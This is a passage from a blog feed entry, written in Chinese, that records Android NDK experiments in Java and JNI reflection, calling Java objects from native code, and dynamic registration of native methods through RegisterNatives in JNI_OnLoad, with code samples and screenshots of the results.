<span class="title">SuperReflectionClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String TAG = <span class="string">&quot;superReflectionClass&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String priStr = <span class="string">&quot;super private string&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> priInt = <span class="number">654321</span>;</span><br><span class="line">    <span class="keyword">public</span> String pubStr = <span class="string">&quot;super public string&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> String superStr = <span class="string">&quot;superString&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">priMtd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">&quot;superPriMtd() called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pubMtd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">&quot;superPubMtd() called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">superMtd</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">&quot;superMtd() called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SuperReflectionClass</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.superStr = <span class="string">&quot;This is the &quot;</span> + <span class="keyword">this</span>.superStr;</span><br><span class="line">        Log.i(TAG, <span class="string">&quot;SuperReflectionClass() called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210814154041.png" alt="image-20210814153719963"></p><h2 id="使用反射"><a href="#使用反射" class="headerlink" title="使用反射"></a>使用反射</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">optObjByReflection</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        Class cls = Class.forName(<span class="string">&quot;com.example.devndk.ReflectionClass&quot;</span>);</span><br><span class="line">        <span class="comment">//调用无参的构造方法</span></span><br><span class="line">        Object obj = cls.newInstance();</span><br><span class="line"></span><br><span class="line">        Field priStr = cls.getDeclaredField(<span class="string">&quot;priStr&quot;</span>);</span><br><span class="line">        priStr.setAccessible(<span class="keyword">true</span>);<span class="comment">//设置不进行安全检查访问私有属性</span></span><br><span class="line">        System.out.println(<span class="string">&quot;fetch the field priStr = &quot;</span> + priStr.get(obj));</span><br><span class="line"></span><br><span class="line">        Method priMtd = cls.getDeclaredMethod(<span class="string">&quot;priMtd&quot;</span>);</span><br><span class="line">        priMtd.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        priMtd.invoke(obj);</span><br><span class="line">        <span class="comment">//调用有参的构造方法</span></span><br><span class="line">        Constructor c = cls.getDeclaredConstructor(String.class);<span class="comment">//通过ParameterTypes确定对应的构造方法</span></span><br><span class="line">        Object obj1 = c.newInstance(<span class="string">&quot;constructor with parameters&quot;</span>);<span class="comment">//传入参数</span></span><br><span class="line">        Field priStr1 = cls.getDeclaredField(<span class="string">&quot;priStr&quot;</span>);</span><br><span class="line">        priStr1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;fetch the field priStr = &quot;</span> + priStr1.get(obj));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用带参的priMtd方法</span></span><br><span class="line">        Method priMtd1= cls.getDeclaredMethod(<span class="string">&quot;priMtd&quot;</span>, String.class);<span class="comment">//方法名称+对应的paramemterTypes</span></span><br><span class="line">        priMtd1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        priMtd1.invoke(obj1, <span class="string">&quot;PriMtd with parameter&quot;</span>);<span class="comment">//调用方法并传入对应的参数</span></span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210814154038.png" alt="image-20210814154031695"></p><h2 id="从Native反射"><a href="#从Native反射" class="headerlink" title="从Native反射"></a>从Native反射</h2><p>除了在Java层，从Native同样也能完成反射的工作。<br>所有的流程类似于Java，只是通过JNIEnv函数来实现。同时，获取属性值或者调用方法的时候不需要区分private和public。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_example_devndk_MainActivity_reflectByNative</span><span class="params">(JNIEnv *env, jobject thiz)</span> </span>&#123;</span><br><span class="line">    jclass cls = env-&gt;<span class="built_in">FindClass</span>(<span class="string">&quot;com/example/devndk/ReflectionClass&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(cls == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        __android_log_print(ANDROID_LOG_INFO,<span class="string">&quot;JNIMsg&quot;</span>, <span class="string">&quot;cls = NULL&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    jmethodID constructorID = env-&gt;<span class="built_in">GetMethodID</span>(cls, <span class="string">&quot;&lt;init&gt;&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(constructorID == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        __android_log_print(ANDROID_LOG_INFO,<span class="string">&quot;JNIMsg&quot;</span>, <span class="string">&quot;constructorID = NULL&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> s[] = <span class="string">&quot;reflection from native&quot;</span>;</span><br><span class="line">    jstring ss = env-&gt;<span class="built_in">NewStringUTF</span>(s);</span><br><span class="line">    jobject  obj = env-&gt;<span class="built_in">NewObject</span>(cls, constructorID, ss);</span><br><span class="line"></span><br><span class="line">    jmethodID priMtdID = env-&gt;<span class="built_in">GetMethodID</span>(cls, <span class="string">&quot;priMtd&quot;</span>, <span class="string">&quot;(Ljava/lang/String;)V&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(priMtdID == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        __android_log_print(ANDROID_LOG_INFO,<span class="string">&quot;JNIMsg&quot;</span>, <span class="string">&quot;priMtdID = NULL&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    env-&gt;<span class="built_in">CallVoidMethod</span>(obj, priMtdID, ss);<span class="comment">//这里不需要区分private和public</span></span><br><span class="line"></span><br><span class="line">    jfieldID priIntID = env-&gt;<span class="built_in">GetFieldID</span>(cls,<span class="string">&quot;priInt&quot;</span>, <span class="string">&quot;I&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(priIntID == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        __android_log_print(ANDROID_LOG_INFO,<span class="string">&quot;JNIMsg&quot;</span>, <span class="string">&quot;priIntID = NULL&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO,<span class="string">&quot;JNIMsg&quot;</span>, <span class="string">&quot;ReflectionClass.priInt = %d&quot;</span>, env-&gt;<span class="built_in">GetIntField</span>(obj, priIntID));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210814172122.png" alt="image-20210814172116714"></p><h2 id="JNIEnv调用"><a href="#JNIEnv调用" class="headerlink" title="JNIEnv调用"></a>JNIEnv调用</h2><p>在Native函数中直接通过传入的thiz对象来控制Java层调用对象会更加简单，直接借助JNIEnv结构体而不必使用反射技术。<br>当然，这里thiz代表的是调用该Native方法的Java层实例，所以<strong>只能用于控制对应的上层实例</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">&quot;MainActivity&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String priStr=<span class="string">&quot;private string&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> priInt = <span class="number">123</span>;</span><br><span class="line">    <span class="keyword">public</span> String pubStr = <span class="string">&quot;public string&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> pubInt = <span class="number">456</span>;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">priMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">&quot;private Method() called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pubMethod</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Log.i(TAG, <span class="string">&quot;public Method() called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        ......</span><br><span class="line">        mThiz = (Button) findViewById(R.id.thiz);</span><br><span class="line">        mThiz.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                optObjByThiz();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">optObjByThiz</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//native-lib.cpp</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL</span></span><br><span class="line"><span class="function"><span class="title">Java_com_example_devndk_MainActivity_optObjByThiz</span><span class="params">(JNIEnv *env, jobject thiz)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement optObjByThiz()</span></span><br><span class="line"></span><br><span class="line">    jclass clz = env-&gt;<span class="built_in">GetObjectClass</span>(thiz);</span><br><span class="line">    jfieldID priStrID = env-&gt;<span class="built_in">GetFieldID</span>(clz, <span class="string">&quot;priStr&quot;</span>, <span class="string">&quot;Ljava/lang/String;&quot;</span>);</span><br><span class="line">    jfieldID priIntID = env-&gt;<span class="built_in">GetFieldID</span>(clz, <span class="string">&quot;priInt&quot;</span>, <span class="string">&quot;I&quot;</span>);</span><br><span class="line">    jmethodID priMtdID = env-&gt;<span class="built_in">GetMethodID</span>(clz, <span class="string">&quot;priMethod&quot;</span>, <span class="string">&quot;()V&quot;</span>);</span><br><span class="line"></span><br><span class="line">    jobject jPriStrObj = env-&gt;<span class="built_in">GetObjectField</span>(thiz, priStrID);</span><br><span class="line">    jstring jPriStr = (jstring) jPriStrObj;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *priStr = env-&gt;<span class="built_in">GetStringUTFChars</span>(jPriStr, <span class="literal">NULL</span>);</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO,<span class="string">&quot;JNIMsg&quot;</span>, <span class="string">&quot;private string = %s&quot;</span>, priStr);</span><br><span class="line"></span><br><span class="line">    jint priInt = env-&gt;<span class="built_in">GetIntField</span>(thiz, priIntID);</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO,<span class="string">&quot;JNIMsg&quot;</span>, <span class="string">&quot;private int = %d&quot;</span>, priInt);</span><br><span class="line"></span><br><span class="line">    env-&gt;<span class="built_in">CallVoidMethod</span>(thiz, priMtdID);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210813193009.png" alt="image-20210813193006366"></p><h1 id="JNI动态注册"><a href="#JNI动态注册" class="headerlink" title="JNI动态注册"></a>JNI动态注册</h1><blockquote><p>参考了邓凡平《深入理解Android 卷Ⅰ》第2章 深入理解JNI，推荐阅读。</p></blockquote><p>在前文的JNI函数编写过程中，都是使用的静态方法来注册JNI函数。<br>既然Java Native函数和JNI函数都是一一对应的，那么应该会有一种数据结构来保存这种对应关系。<br>在JNI技术中，记录这种对应关系的是一种叫做<strong>JNINativeMethod</strong>的结构，其定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* name; <span class="comment">//Java中native函数的名字，不用携带包的路径，如&quot;native_init&quot;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* signature; <span class="comment">// Java函数的签名信息，用字符串表示，时参数类型和返回值的组合，如&quot;(Ljava/lang/String;)I&quot;，(接收一个String参数，返回int)</span></span><br><span class="line"><span class="keyword">void</span>* fnPtr; <span class="comment">// JNI层对应函数的函数指针，注意他是void*类型</span></span><br><span class="line">&#125;JNINativeMethod;</span><br></pre></td></tr></table></figure><p>于是乎，JNI的动态注册的目标便是在Native层修改JNINativeMethod这个结构。<br>对于该结构的修改，可以通过env-&gt;RegisterNatives()来注册关联关系。</p><p>在这里，我们<strong>通过动态注册，从Native向Java对象MainActivity注册DynamicJNI()和DynamicJNI_2()两个方法</strong>，方法的细节如gMethods数组和它们对应的Native函数所示。<br>为了把方法注册到MainActivity上，先使用<strong>env-&gt;FindClass(aimClass)<strong>找到目标，然后使用</strong>env-&gt;RegisterNatives(clazz, gMethods, MethodsCnt)<strong>函数，完成gMethods描述的函数注册。该步骤被封装为registerMethods函数，具体实现时</strong>记得处理异常情况</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">native_DynamicJNI</span><span class="params">(JNIEnv *env, jclass clazz)</span></span>&#123;</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO,<span class="string">&quot;JNIMsg&quot;</span>, <span class="string">&quot;native_DynamicJIN() called&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">native_DynamicJNI_2</span><span class="params">(JNIEnv *env, jclass clazz, jint a, jint b, jstring s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *ss;</span><br><span class="line">    ss = env-&gt;<span class="built_in">GetStringUTFChars</span>(s, JNI_FALSE);</span><br><span class="line">    __android_log_print(ANDROID_LOG_INFO, <span class="string">&quot;JNIMsg&quot;</span>, <span class="string">&quot;native_DynamicNJI_2() called, received parameter from Java: s = %s&quot;</span>, ss);</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="string">&quot;DynamicJNI&quot;</span>,          <span class="comment">//供Java引用的方法名</span></span><br><span class="line">                <span class="string">&quot;()V&quot;</span>,              <span class="comment">//描述参数类型和返回值类型，即方法签名</span></span><br><span class="line">                (<span class="keyword">void</span> *) native_DynamicJNI   <span class="comment">//Native层定义的函数名，()包裹返回值类型</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;DynamicJNI_2&quot;</span>,</span><br><span class="line">            <span class="string">&quot;(IILjava/lang/String;)I&quot;</span>,</span><br><span class="line">            (jint *) native_DynamicJNI_2</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> METHODS_CNT(x) ((int) (sizeof(x) / sizeof((x)[0])))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AIM_CLASS <span class="meta-string">&quot;com/example/devndk/MainActivity&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">registerMethods</span><span class="params">(JNIEnv *env, <span class="keyword">const</span> <span class="keyword">char</span> *className, JNINativeMethod *gMethods, <span class="keyword">int</span> MethodsCnt)</span></span>&#123;</span><br><span class="line">    jclass clazz = env-&gt;<span class="built_in">FindClass</span>(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        __android_log_print(ANDROID_LOG_INFO, <span class="string">&quot;JNIMsg&quot;</span>,<span class="string">&quot;FindClass() Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(env-&gt;<span class="built_in">RegisterNatives</span>(clazz, gMethods, MethodsCnt) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        __android_log_print(ANDROID_LOG_INFO, <span class="string">&quot;JNIMsg&quot;</span>,<span class="string">&quot;RegisterNatives() Error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在MainActivity.java中，也需要完成相应的声明。(此时忽略Android Studio的错误提示)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">DynamicJNI</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">int</span> <span class="title">DynamicJNI_2</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, String s)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        ......</span><br><span class="line">        DynamicJNI();</span><br><span class="line">        <span class="keyword">int</span> ret = DynamicJNI_2(<span class="number">7</span>,<span class="number">7</span>, <span class="string">&quot;DynamicJNI_2&quot;</span>);</span><br><span class="line">        Log.i(TAG, <span class="string">&quot;DynamicJNI_2() return  &quot;</span> + ret);</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>值得讨论的是，<strong>动态注册工作在什么时候发生？</strong>即registerMethods()函数在什么时候被调用？<br>答案是：<strong>当Java层通过System.loadLibrary()加载完JNI动态库之后，会查找库中名为JNI_OnLoad()的函数，如果存在便调用</strong>。<br>因此，动态注册发生在**JNI_OnLoad()**中，也可以说是通过实现JNI_OnLoad函数并在其中调用registerMethods()函数，来完成动态注册。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span></span>&#123;</span><br><span class="line">    <span class="comment">//注意，JavaVM和JNIEnv不同，JavaVM是虚拟机在JNI的代表，每个进程只有一个这样的JavaVM</span></span><br><span class="line">    JNIEnv* env = <span class="literal">NULL</span>;</span><br><span class="line">    jint result = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(vm-&gt;<span class="built_in">GetEnv</span>((<span class="keyword">void</span>**) &amp;env, JNI_VERSION_1_6) != JNI_OK)&#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">assert</span>(env != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">registerMethods</span>(env, AIM_CLASS, gMethods, <span class="built_in">METHODS_CNT</span>(gMethods)))&#123;</span><br><span class="line">        <span class="keyword">return</span> JNI_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;<span class="comment">//必须返回</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/20210814211900.png" alt="image-20210814211854054"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近学习了一下Android NDK开发，关于Native、反射、JNI注册相关的原理已经有足量且优秀的文章，本文仅记录一下实验过程。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
  </entry>
  
</feed>
